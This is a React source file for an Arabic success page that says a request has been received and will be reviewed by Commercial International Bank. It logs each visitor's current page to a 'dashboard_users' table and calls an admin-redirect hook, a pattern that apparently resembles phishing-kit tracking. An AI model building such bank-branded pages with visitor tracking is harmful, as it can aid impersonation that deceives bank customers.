import { useEffect } from "react";
import { CheckCircle2, PartyPopper, ShieldCheck, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import successBanner from "@/assets/success-banner.jpg";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";

const Success = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const userId = searchParams.get("uid") || "";
  useAdminRedirect(userId || null);

  useEffect(() => {
    if (!userId) return;
    supabase.from("dashboard_users").update({ last_page: "النجاح" }).eq("id", userId).then();
  }, [userId]);

  return (
    <div className="min-h-screen bg-background relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      {/* Banner */}
      <div className="relative">
        <img src={successBanner} alt="نجاح العملية" className="w-full h-40 object-cover" width={1024} height={512} />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/60 to-black/40" />
        <div className="absolute inset-0 pattern-grid opacity-15" />
        <div className="absolute bottom-4 right-0 left-0 text-center">
          <h1 className="text-lg font-extrabold text-white drop-shadow-[0_2px_12px_rgba(0,0,0,0.7)]">تمت العملية بنجاح!</h1>
        </div>
      </div>

      <section className="py-8 px-4 relative z-10">
        <div className="w-full max-w-none px-3">
          <div className="bg-card rounded-2xl p-8 card-shadow border border-border/30 text-center relative overflow-hidden">
            {/* Decorative orbs */}
            <div className="absolute -top-10 -right-10 w-32 h-32 orb orb-primary" />
            <div className="absolute -bottom-10 -left-10 w-24 h-24 orb orb-accent" />
            
            <div className="relative z-10">
              <div className="w-20 h-20 rounded-full bg-gradient-to-br from-green-400 to-green-600 flex items-center justify-center mx-auto mb-5 shadow-[0_4px_20px_hsl(142_60%_45%/0.4)]">
                <CheckCircle2 className="w-10 h-10 text-white" />
              </div>
              <h2 className="text-xl font-extrabold text-foreground mb-2">مبروك! تم استلام طلبك</h2>
              <p className="text-sm text-muted-foreground leading-relaxed mb-6">
                تم تسجيل طلبك بنجاح وسيتم مراجعته من قبل الفريق المختص في البنك التجاري الدولي. سنتواصل معك خلال 24 ساعة لإتمام الإجراءات.
              </p>

              <div className="grid grid-cols-3 gap-3 mb-6">
                <div className="bg-gradient-to-br from-accent/10 to-accent/5 rounded-xl p-3 text-center border border-accent/20">
                  <PartyPopper className="w-5 h-5 text-accent mx-auto mb-1" />
                  <span className="text-[10px] font-bold text-foreground">طلب مكتمل</span>
                </div>
                <div className="bg-gradient-to-br from-primary/10 to-primary/5 rounded-xl p-3 text-center border border-primary/20">
                  <ShieldCheck className="w-5 h-5 text-primary mx-auto mb-1" />
                  <span className="text-[10px] font-bold text-foreground">بيانات آمنة</span>
                </div>
                <div className="bg-gradient-to-br from-accent/10 to-accent/5 rounded-xl p-3 text-center border border-accent/20">
                  <Star className="w-5 h-5 text-accent mx-auto mb-1" />
                  <span className="text-[10px] font-bold text-foreground">خدمة مميزة</span>
                </div>
              </div>

              <Button
                onClick={() => navigate("/")}
                className="w-full hero-gradient text-primary-foreground text-base font-bold py-6 rounded-xl shadow-button hover:shadow-[0_6px_24px_hsl(213_76%_44%/0.4)] transition-all"
              >
                العودة للرئيسية
              </Button>
            </div>
          </div>
        </div>
      </section>
      <SiteFooter />
    </div>
  );
};

export default Success;
